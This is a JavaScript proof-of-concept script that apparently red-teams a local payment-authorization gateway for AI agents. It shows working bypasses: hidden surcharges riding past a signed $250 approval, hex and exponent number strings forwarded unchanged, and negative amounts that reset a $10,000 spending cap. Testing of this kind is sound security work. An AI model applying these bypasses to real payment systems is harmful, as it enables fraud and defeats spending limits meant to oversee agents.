import { newAgent, sign, authorize } from './agent.mjs';
const GW='http://127.0.0.1:4401', API='http://127.0.0.1:4402', PROXY='http://127.0.0.1:4405', UP='http://127.0.0.1:4403';
const agent=newAgent();
const upCalls=async()=>(await (await fetch(UP+'/__calls')).json());
const state=async()=>(await (await fetch(API+'/__state')).json());
async function proxy(signed,body){const r=await fetch(`${PROXY}/book-flight`,{method:'POST',headers:{'content-type':'application/json','x-magp-request':JSON.stringify(signed)},body});return {status:r.status,text:await r.text()};}
async function scaffold(signed,body){const r=await fetch(`${GW}/book-flight`,{method:'POST',headers:{'content-type':'application/json','x-magp-request':JSON.stringify(signed)},body});let j=null;try{j=await r.json()}catch{}return{status:r.status,body:j};}

// A6 — the decoy bypass also lands on the SCAFFOLD gateway (bookFlight runs with the poisoned args)
console.log('=== A6  same decoy bypass on the SCAFFOLD gateway (requireAuth+deny ON) ===');
await fetch(API+'/__reset');
{ const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await scaffold(s,JSON.stringify({amount:250,extras:{surcharge:4750,merchant:'evil-corp'}}));
  console.log(`  scaffold: ${r.status} bookFlight ran with -> ${JSON.stringify(r.body)}`);
  console.log(`  ${r.status===200 && r.body?.extras?.surcharge===4750 ? '*** BYPASS: signed/authorized $250, executed with a $4750 hidden surcharge' : 'blocked'}`); }

// A7 — numeric-string parser differential reaches the REAL upstream verbatim
console.log('\n=== A7  amount "0xFA"/"2.5e2" bound as 250, forwarded verbatim to upstream ===');
for (const v of ['0xFA','2.5e2','250.00',' 250']){
  await fetch(API+'/__reset'); await fetch(UP+'/__reset',{method:'POST'});
  const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await proxy(s,JSON.stringify({amount:v,currency:'USD',merchant:'skyward-air'}));
  const c=await upCalls();
  console.log(`  body amount=${JSON.stringify(v)} -> proxy ${r.status}; upstream received amount as: ${c.length?JSON.parse(c[0].body).amount+' ('+typeof JSON.parse(c[0].body).amount+')':'nothing'}`);
}

// A8 — negative amount drains the cumulative reservation, reopening spend past the cap
console.log('\n=== A8  negative-amount authorizations vs the $10,000 cumulative reservation ===');
await fetch(API+'/__reset');
console.log('  start reserved:', (await state()).reserved);
// spend up to the cap honestly
let ok=0; for(let i=0;i<40;i++){const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});if(a.decision!=='allow')break;ok++;}
console.log(`  after ${ok} honest $250 authorizations, reserved = $${(await state()).reserved}`);
let blk=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
console.log(`  next honest authorize: ${blk.decision} ${blk.reasonCode??''} (cap reached)`);
// now authorize a big NEGATIVE amount to push reserved back down
const neg=await authorize(API,agent,{action:'book-flight',amount:-9000,merchant:'skyward-air'});
console.log(`  authorize amount=-9000: ${neg.decision} ${neg.reasonCode??''} -> reserved now $${(await state()).reserved}`);
let after=0; for(let i=0;i<40;i++){const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});if(a.decision!=='allow')break;after++;}
console.log(`  ${neg.decision==='allow'&&after>0?'*** BYPASS':'blocked'}: ${after} MORE $250 authorizations after the negative reset (total honest+extra = $${(ok+after)*250} through a $10,000 cap)`);
